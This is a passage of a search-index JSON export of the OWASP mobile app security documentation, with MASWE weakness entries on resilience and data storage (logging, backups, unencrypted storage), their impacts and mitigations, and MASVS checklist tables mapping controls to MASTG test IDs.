</ul>","tags":["android","ios","R","maswe","masvs-resilience-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0105/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0047 - Testing File Integrity Checks (android)</li> <li>MASTG-TEST-0090 - Testing File Integrity Checks (ios)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0106/","title":"MASWE-0106: Official Store Verification Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0106</p>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0106/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app's code doesn\u2019t implement effective techniques to verify if it is downloaded from an official store and therefore not relying on security and other assurances provided by the store (CWE-693).</p>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0106/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>checking the app's signature or package name</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0106/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0107/","title":"MASWE-0107: Runtime Code Integrity Not Verified","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0107</p>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0107/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app's code doesn\u2019t implement effective techniques to verify the integrity of its own code at runtime (CWE-693).</p>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0107/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>memory tampering detection</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-RESILIENCE/MASWE-0107/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0050 - Testing Runtime Integrity Checks (android)</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-2","placeholder"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0001/","title":"MASWE-0001: Insertion of Sensitive Data into Logs","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L1","L2","P","maswe","masvs-storage-2","masvs-privacy-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0001/#overview","title":"Overview","text":"<p>Mobile apps may write sensitive data to logs. This may include sensitive user data, such as passwords, credit card numbers, or other personally identifiable information (PII), as well as sensitive system data, such as cryptographic keys, session tokens, or other sensitive information.</p> <p>Logging all possible information is very useful at development time, especially for debugging the app. However, in production it might not always be necessary and should be prevented whenever possible to avoid any accidentally exposure to potential attackers.</p>","tags":["android","ios","L1","L2","P","maswe","masvs-storage-2","masvs-privacy-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0001/#modes-of-introduction","title":"Modes of Introduction","text":"<p>This can typically occur in two ways:</p> <ul> <li>System Logs: The application may log sensitive data to the system log, which can be accessed by other applications on the device (in old OS versions or compromised devices or if they hold the appropriate permissions).</li> <li>App Logs: The application may log sensitive data to a file in the application's data directory, which can be accessed by any application on the device if the device is rooted.</li> </ul>","tags":["android","ios","L1","L2","P","maswe","masvs-storage-2","masvs-privacy-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0001/#impact","title":"Impact","text":"<p>Loss of confidentiality: Sensitive data within logs is at risk of being exposed to an attacker with access to the device who may be able to extract it. This may lead to further attacks, such as identity theft, or compromise of the application's backend.</p>","tags":["android","ios","L1","L2","P","maswe","masvs-storage-2","masvs-privacy-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0001/#mitigations","title":"Mitigations","text":"<p>The following are generic recommendations to avoid logging sensitive data in production releases:</p> <ul> <li>Avoid logging sensitive data at all.</li> <li>Redact sensitive data in logs.</li> <li>Remove logging statements unless deemed necessary to the application or explicitly identified as safe, e.g. as a result of a security audit.</li> <li>Use log levels properly to ensure that sensitive data is not logged in production releases.</li> <li>Use flags to disable logging in production releases.</li> </ul> <p>The documentation for each platform provides best practices for developers:</p> <ul> <li>Android mitigations to avoid log disclosure</li> <li>iOS mitigations to avoid log disclosure</li> </ul>","tags":["android","ios","L1","L2","P","maswe","masvs-storage-2","masvs-privacy-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0001/#tests","title":"Tests","text":"<p> MASTG-TEST-0231: References to Logging APIs  MASTG-TEST-0203: Runtime Use of Logging APIs </p>","tags":["android","ios","L1","L2","P","maswe","masvs-storage-2","masvs-privacy-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0002/","title":"MASWE-0002: Sensitive Data Stored With Insufficient Access Restrictions in Internal Locations","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0002</p>","tags":["android","L1","L2","maswe","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0002/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Sensitive data may be stored in internal locations without ensuring exclusive app access (e.g. by using the wrong file permissions) and may be accessible to other apps.</p>","tags":["android","L1","L2","maswe","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0002/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>File permissions (Android)</li> <li>improperly configured FileProvider (Android)</li> <li>Avoid the deprecated MODE_WORLD_WRITEABLE and MODE_WORLD_READABLE modes for IPC files, see https://developer.android.com/privacy-and-security/security-tips#internal-storage. They don't provide the ability to limit data access to particular applications, and they don't provide any control of data format. If you want to share your data with other app processes, consider using a content provider instead, which offers read and write permissions to other apps and can make dynamic permission grants on a case-by-case basis.</li> <li>Keychain items holding arbitrary data (excluding keys for this weakness) protected with weak protections such as kSecAttrAccessibleAlways, kSecAttrAccessibleAfterFirstUnlock,  kSecAttrAccessibleWhenUnlocked (iOS)</li> </ul>","tags":["android","L1","L2","maswe","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0002/#references","title":"References","text":"<ul> <li>https://developer.android.com/about/versions/nougat/android-7.0-changes#permfilesys</li> <li>https://developer.android.com/privacy-and-security/security-tips#internal-storage</li> </ul>","tags":["android","L1","L2","maswe","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0002/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0001 - Testing Local Storage for Sensitive Data (android)</li> <li>MASTG-TEST-0052 - Testing Local Data Storage (ios)</li> </ul>","tags":["android","L1","L2","maswe","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0003/","title":"MASWE-0003: Backup Unencrypted","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0003</p>","tags":["android","L2","maswe","masvs-storage-2","masvs-privacy-1","placeholder"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0003/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app may not encrypt sensitive data in backups, which may compromise data confidentiality.</p>","tags":["android","L2","maswe","masvs-storage-2","masvs-privacy-1","placeholder"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0003/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Backup Device Conditions clientSideEncryption and deviceToDeviceTransfer Not Checked (Android)</li> </ul>","tags":["android","L2","maswe","masvs-storage-2","masvs-privacy-1","placeholder"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0003/#references","title":"References","text":"<ul> <li>https://developer.android.com/guide/topics/data/autobackup#define-device-conditions</li> </ul>","tags":["android","L2","maswe","masvs-storage-2","masvs-privacy-1","placeholder"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0003/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0009 - Testing Backups for Sensitive Data (android)</li> <li>MASTG-TEST-0058 - Testing Backups for Sensitive Data (ios)</li> </ul>","tags":["android","L2","maswe","masvs-storage-2","masvs-privacy-1","placeholder"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0004/","title":"MASWE-0004: Sensitive Data Not Excluded From Backup","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L1","L2","P","maswe","masvs-storage-2","masvs-privacy-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0004/#overview","title":"Overview","text":"<p>iOS and Android automatically back up app data to cloud services, and users can also create local backups on physical machines, or backups are automatically created during data transfers when switching between phones. When developers fail to properly configure how their app handles backups and neglect to exclude sensitive files, the backups may contain sensitive user and app data. Under certain conditions, the backups may not be adequately secured by the cloud provider, or a malicious actor could tamper with the backed up files, potentially altering the app's behavior or extracting confidential information.</p>","tags":["android","ios","L1","L2","P","maswe","masvs-storage-2","masvs-privacy-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0004/#impact","title":"Impact","text":"<ul> <li>Modification of App's Behavior: An attacker can tamper with data inside the backup, altering the app's logic. For example, they could modify a database that tracks the state of premium features and then restore the modified backup to the device. Another common scenario is backing up the device before redeeming a one-time coupon and restoring the backup afterward, which would allow the malicious actor to reuse the same coupon multiple times.</li> <li>Loss of Confidentiality: Sensitive data stored in backups (e.g., personal information, photos, documents or audio files) may be extracted by attackers, leading to privacy breaches.</li> <li>Leakage of Authentication Material: An attacker can extract passwords, cryptographic keys, and session tokens to facilitate additional attacks, such as identity theft, account takeover, or unauthorized access.</li> </ul>","tags":["android","ios","L1","L2","P","maswe","masvs-storage-2","masvs-privacy-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0004/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Automatic System Backups: By default, iOS and Android back up app data to the cloud once the user consents during the initial setup.</li> <li>Local Backups: Users can back up their devices to local systems (e.g., laptops). If local backups are stored unencrypted or not securely handled, attackers could tamper with this data.</li> <li>Device-To-Device Transfer: Transferring data between devices (e.g., via iCloud or Google's device-to-device migration tools) enables an attacker to perform similar attacks.</li> </ul>","tags":["android","ios","L1","L2","P","maswe","masvs-storage-2","masvs-privacy-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0004/#mitigations","title":"Mitigations","text":"<ul> <li>Exclude sensitive files from backups using platform-specific attributes, such as <code>android:allowBackup</code> or <code>BackupAgent</code> with <code>excludeFromBackup</code> for Android. On iOS, API such as <code>NSURLIsExcludedFromBackupKey</code> doesn't guarantee exclusion from the backup. Therefore, you should encrypt your data instead.</li> <li>Store sensitive data in locations excluded from backups by default, like the Keychain or <code>Library/Caches</code> on iOS.</li> <li>Encrypt sensitive data before storage to ensure confidentiality, even if it gets backed up.</li> </ul>","tags":["android","ios","L1","L2","P","maswe","masvs-storage-2","masvs-privacy-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0004/#tests","title":"Tests","text":"<p> MASTG-TEST-0216: Sensitive Data Not Excluded From Backup  MASTG-TEST-0262: References to Backup Configurations Not Excluding Sensitive Data  MASTG-TEST-0215: Sensitive Data Not Excluded From Backup </p>","tags":["android","ios","L1","L2","P","maswe","masvs-storage-2","masvs-privacy-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0006/","title":"MASWE-0006: Sensitive Data Stored Unencrypted in Private Storage Locations","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L2","maswe","masvs-storage-1","masvs-crypto-2"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0006/#overview","title":"Overview","text":"<p>Mobile apps may need to store sensitive data locally within private storage locations such as the application sandbox and this data is at risk of exposure via, for example, incorrect file permissions, an app vulnerability, device vulnerability or data backup mechanisms.</p> <p>Sensitive data may include personally identifiable information (PII), passwords, cryptographic keys or session tokens.</p>","tags":["android","ios","L2","maswe","masvs-storage-1","masvs-crypto-2"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0006/#impact","title":"Impact","text":"<ul> <li>Loss of Confidentiality: Under the right conditions an attacker could extract sensitive data stored internally within the application sandbox leading to loss of confidentiality and enable further attacks such as identity theft or account takeover.</li> </ul>","tags":["android","ios","L2","maswe","masvs-storage-1","masvs-crypto-2"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0006/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Data Stored Unencrypted: Sensitive data is written to the app's private data directory (sandbox) unencrypted.</li> <li>Hardcoded Encryption Key: Sensitive data is encrypted but the key is hardcoded inside the application.</li> <li>Encryption Key Stored on Filesystem: Sensitive data is encrypted but the key is stored alongside it or in another easily accessible location.</li> <li>Encryption Used is Insufficient: Sensitive data is encrypted but the encryption is not considered to be strong.</li> </ul>","tags":["android","ios","L2","maswe","masvs-storage-1","masvs-crypto-2"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0006/#mitigations","title":"Mitigations","text":"<ul> <li>Avoid storing sensitive data locally if not required for application functionality to reduce the likelihood and impact of this weakness. For example keeping PII server-side, rendering it at time of use, and removing any cached data on logout.</li> <li>Store cryptographic keys exclusively using the platform's hardware-backed keystore solution, such as the Android Keystore or the iOS Keychain.</li> <li>For storing other files and preferences, use platform-provided features for encrypting data at rest or other techniques implementing envelope encryption with Data Encryption Keys (DEK) and Key Encryption Keys (KEK) or equivalent methods. For example, on Android, use <code>EncryptedFile</code> or <code>EncryptedSharedPreferences</code>; on iOS, use iOS Data Protection.</li> </ul> <p>Warning</p> <p>The Jetpack security crypto library, including the <code>EncryptedFile</code> and  <code>EncryptedSharedPreferences</code> classes, has been deprecated. However, since an official replacement has not yet been released, we recommend using these classes until one is available.</p>","tags":["android","ios","L2","maswe","masvs-storage-1","masvs-crypto-2"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0006/#tests","title":"Tests","text":"<p> MASTG-TEST-0287: Sensitive Data Stored Unencrypted via the SharedPreferences API to the App Sandbox  MASTG-TEST-0207: Data Stored in the App Sandbox at Runtime </p>","tags":["android","ios","L2","maswe","masvs-storage-1","masvs-crypto-2"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0007/","title":"MASWE-0007: Sensitive Data Stored Unencrypted in Shared Storage Requiring No User Interaction","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","L1","L2","maswe","masvs-storage-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0007/#overview","title":"Overview","text":"<p>Apps frequently opt to store data in the external storage due to its larger capacity. However, this convenience comes with a potential security drawback. Once a malicious app is granted the relevant permissions, it can access this data without user consent or interaction at any time. Additionally, external storage like SD cards can be physically removed and read by a malicious actor. Even if the external storage is emulated by the system, the risk arises from improper file permissions or the misuse of APIs for saving files. In such cases, the files become vulnerable to unauthorized access, modifications and deletions, posing a security threat to the application.</p> <p>Developers may consider switching to Private Storage or Shared Storage Requiring User Interaction if they need more privacy and security. However, if the external storage is the most suitable for the app, it's a good practise to encrypt data stored in the external storage. Below you can find potential security impacts and mitigations linked to the use of the external storage.</p>","tags":["android","L1","L2","maswe","masvs-storage-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0007/#impact","title":"Impact","text":"<ul> <li> <p>Loss of confidentiality: An attacker can extract sensitive data stored externally, such as personal information and media like photos, documents, and audio files.</p> </li> <li> <p>Loss of secure material: An attacker can extract passwords, cryptographic keys, and session tokens to facilitate additional attacks, such as identity theft or account takeover.</p> </li> <li> <p>Modification of app's behaviour: An attacker can tamper with data used by the app, altering the app's logic. For example, they could modify a database describing the state of premium features or inject a malicious payload to enable further attacks such as SQL injection and Path Traversal.</p> </li> <li> <p>Modification of downloaded code: An app can download new functionality from the Internet and store the executable code in external storage before loading it into the process. An attacker can modify this code before it is used by the app.</p> </li> </ul>","tags":["android","L1","L2","maswe","masvs-storage-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0007/#modes-of-introduction","title":"Modes of Introduction","text":"<p>This threat is primarily a concern for Android devices since they permit the use of external storage. Even if a device lacks physical external storage, Android emulates it to provide access to the external storage API.</p> <ul> <li>Data Stored Unencrypted: Sensitive data is stored in the external storage unencrypted.</li> <li>Hardcoded Encryption Key: Sensitive data is encrypted and stored in the external storage but the key is hardcoded inside the application.</li> <li>Encryption Key Stored on Filesystem: Sensitive data is encrypted and stored in the external storage but the key is stored alongside it or in another easily accessible location.</li> <li>Encryption Used is Insufficient: Sensitive data is encrypted but the encryption is not considered to be strong.</li> <li>Reuse of encryption key: The encryption key is shared between two devices owned by a single user, enabling the process of data cloning between these devices in the external storage.</li> </ul> <p>On iOS, apps cannot directly write to or read from the arbitrary locations, as compared to desktop operating system or Android. iOS maintains strict sandboxing rules, meaning apps can only access their own sandboxed file directories.</p>","tags":["android","L1","L2","maswe","masvs-storage-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0007/#mitigations","title":"Mitigations","text":"<p>Sensitive data stored in the external storage should be encrypted, and any keys used for data encryption should be protected by the device's hardware-backed keystore, where available. It is highly discouraged to include cryptographic keys hardcoded inside the application. You can also consider storing your files in the private app sandbox or internal storage and using Android's EncryptedFile API wrapper for file encryption.</p> <p>Warning</p> <p>The Jetpack security crypto library, including the <code>EncryptedFile</code> and  <code>EncryptedSharedPreferences</code> classes, has been deprecated. However, since an official replacement has not yet been released, we recommend using these classes until one is available.</p>","tags":["android","L1","L2","maswe","masvs-storage-1"]},{"location":"MASWE/MASVS-STORAGE/MASWE-0007/#tests","title":"Tests","text":"<p> MASTG-TEST-0201: Runtime Use of APIs to Access External Storage  MASTG-TEST-0200: Files Written to External Storage  MASTG-TEST-0202: References to APIs and Permissions for Accessing External Storage </p>","tags":["android","L1","L2","maswe","masvs-storage-1"]},{"location":"checklists/MASVS-AUTH/","title":"MASVS-AUTH","text":"<p>Checklists Updated (June 2025)</p> <p>The checklists now include all MASTG tests, as well as updated mappings to the new MAS profiles.</p> MASVS-ID MASTG-TEST-ID Control / MASTG Test Platform L1 L2 R P Status MASVS-AUTH-1 The app uses secure authentication and authorization protocols and follows the relevant best practices. MASVS-AUTH-2 The app performs local authentication securely according to the platform best practices. MASTG-TEST-0018  Testing Biometric Authentication platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0017  Testing Confirm Credentials platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0064  Testing Biometric Authentication platform:ios profile:L2 deprecatedstatus:deprecated MASVS-AUTH-3 The app secures sensitive operations with additional authentication. <p></p> <p></p>","tags":[]},{"location":"checklists/MASVS-CODE/","title":"MASVS-CODE","text":"<p>Checklists Updated (June 2025)</p> <p>The checklists now include all MASTG tests, as well as updated mappings to the new MAS profiles.</p> MASVS-ID MASTG-TEST-ID Control / MASTG Test Platform L1 L2 R P Status MASVS-CODE-1 The app requires an up-to-date platform version. MASVS-CODE-2 The app has a mechanism for enforcing app updates. MASTG-TEST-0036  Testing Enforced Updating platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0080  Testing Enforced Updating platform:ios profile:L2 update-pendingstatus:update-pending MASVS-CODE-3 The app only uses software components without known vulnerabilities. MASTG-TEST-0042  Checking for Weaknesses in Third Party Libraries platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0085  Checking for Weaknesses in Third Party Libraries platform:ios profile:L1 profile:L2 deprecatedstatus:deprecated MASVS-CODE-4 The app validates and sanitizes all untrusted inputs. MASTG-TEST-0034  Testing Object Persistence platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0026  Testing Implicit Intents platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0002  Testing Local Storage for Input Validation platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0027  Testing for URL Loading in WebViews platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0044  Make Sure That Free Security Features Are Activated platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0025  Testing for Injection Flaws platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0043  Memory Corruption Bugs platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0086  Memory Corruption Bugs platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0087  Make Sure That Free Security Features Are Activated platform:ios profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0079  Testing Object Persistence platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending <p></p> <p></p>","tags":[]},{"location":"checklists/MASVS-CRYPTO/","title":"MASVS-CRYPTO","text":"<p>Checklists Updated (June 2025)</p> <p>The checklists now include all MASTG tests, as well as updated mappings to the new MAS profiles.</p> MASVS-ID MASTG-TEST-ID Control / MASTG Test Platform L1 L2 R P Status MASVS-CRYPTO-1 The app employs current strong cryptography and uses it according to industry best practices. MASTG-TEST-0016  Testing Random Number Generation platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0014  Testing the Configuration of Cryptographic Standard Algorithms platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0013  Testing Symmetric Cryptography platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0061  Verifying the Configuration of Cryptographic Standard Algorithms platform:ios profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0063  Testing Random Number Generation platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASVS-CRYPTO-2 The app performs key management according to industry best practices. MASTG-TEST-0015  Testing the Purposes of Keys platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0062  Testing Key Management platform:ios profile:L2 deprecatedstatus:deprecated <p></p> <p></p>","tags":[]},{"location":"checklists/MASVS-NETWORK/","title":"MASVS-NETWORK","text":"<p>Checklists Updated (June 2025)</p> <p>The checklists now include all MASTG tests, as well as updated mappings to the new MAS profiles.</p> MASVS-ID MASTG-TEST-ID Control / MASTG Test Platform L1 L2 R P Status MASVS-NETWORK-1 The app secures all network traffic according to the current best practices. MASTG-TEST-0019  Testing Data Encryption on the Network platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0020  Testing the TLS Settings platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0023  Testing the Security Provider platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0021  Testing Endpoint Identify Verification platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0065  Testing Data Encryption on the Network platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0066  Testing the TLS Settings platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0067  Testing Endpoint Identity Verification platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASVS-NETWORK-2 The app performs identity pinning for all remote endpoints under the developer's control. MASTG-TEST-0022  Testing Custom Certificate Stores and Certificate Pinning platform:android profile:L2 deprecatedstatus:deprecated MASTG-TEST-0068  Testing Custom Certificate Stores and Certificate Pinning platform:ios profile:L2 update-pendingstatus:update-pending <p></p> <p></p>","tags":[]},{"location":"checklists/MASVS-PLATFORM/","title":"MASVS-PLATFORM","text":"<p>Checklists Updated (June 2025)</p> <p>The checklists now include all MASTG tests, as well as updated mappings to the new MAS profiles.</p> MASVS-ID MASTG-TEST-ID Control / MASTG Test Platform L1 L2 R P Status MASVS-PLATFORM-1 The app uses IPC mechanisms securely. MASTG-TEST-0028  Testing Deep Links platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0024  Testing for App Permissions platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0007  Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0030  Testing for Vulnerable Implementation of PendingIntent platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0029  Testing for Sensitive Functionality Exposure Through IPC platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0072  Testing App Extensions platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0071  Testing UIActivity Sharing platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0070  Testing Universal Links platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0069  Testing App Permissions platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0073  Testing UIPasteboard platform:ios profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0056  Determining Whether Sensitive Data Is Exposed via IPC Mechanisms platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0075  Testing Custom URL Schemes platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASVS-PLATFORM-2 The app uses WebViews securely. MASTG-TEST-0033  Testing for Java Objects Exposed Through WebViews platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0032  Testing WebView Protocol Handlers platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0037  Testing WebViews Cleanup platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0031  Testing JavaScript Execution in WebViews platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0076  Testing iOS WebViews platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0077  Testing WebView Protocol Handlers platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0078  Determining Whether Native Methods Are Exposed Through WebViews platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASVS-PLATFORM-3 The app uses the user interface securely. MASTG-TEST-0010  Finding Sensitive Information in Auto-Generated Screenshots platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0008  Checking for Sensitive Data Disclosure Through the User Interface platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0035  Testing for Overlay Attacks platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0057  Checking for Sensitive Data Disclosed Through the User Interface platform:ios profile:L2 update-pendingstatus:update-pending MASTG-TEST-0059  Testing Auto-Generated Screenshots for Sensitive Information platform:ios profile:L2 update-pendingstatus:update-pending <p></p> <p></p>","tags":[]},{"location":"checklists/MASVS-PRIVACY/","title":"MASVS-PRIVACY","text":"<p>Checklists Updated (June 2025)</p> <p>The checklists now include all MASTG tests, as well as updated mappings to the new MAS profiles.</p> MASVS-ID MASTG-TEST-ID Control / MASTG Test Platform L1 L2 R P Status MASVS-PRIVACY-1 The app minimizes access to sensitive data and resources. MASVS-PRIVACY-2 The app prevents identification of the user. MASVS-PRIVACY-3 The app is transparent about data collection and usage. MASVS-PRIVACY-4 The app offers user control over their data. <p></p> <p></p>","tags":[]},{"location":"checklists/MASVS-RESILIENCE/","title":"MASVS-RESILIENCE","text":"<p>Checklists Updated (June 2025)</p> <p>The checklists now include all MASTG tests, as well as updated mappings to the new MAS profiles.</p> MASVS-ID MASTG-TEST-ID Control / MASTG Test Platform L1 L2 R P Status MASVS-RESILIENCE-1 The app validates the integrity of the platform. MASTG-TEST-0049  Testing Emulator Detection platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0045  Testing Root Detection platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0092  Testing Emulator Detection platform:ios profile:R update-pendingstatus:update-pending MASTG-TEST-0088  Testing Jailbreak Detection platform:ios profile:R deprecatedstatus:deprecated MASVS-RESILIENCE-2 The app implements anti-tampering mechanisms. MASTG-TEST-0050  Testing Runtime Integrity Checks platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0038  Making Sure that the App is Properly Signed platform:android profile:R deprecatedstatus:deprecated MASTG-TEST-0047  Testing File Integrity Checks platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0090  Testing File Integrity Checks platform:ios profile:R update-pendingstatus:update-pending MASTG-TEST-0081  Making Sure that the App Is Properly Signed platform:ios profile:R deprecatedstatus:deprecated MASVS-RESILIENCE-3 The app implements anti-static analysis mechanisms. 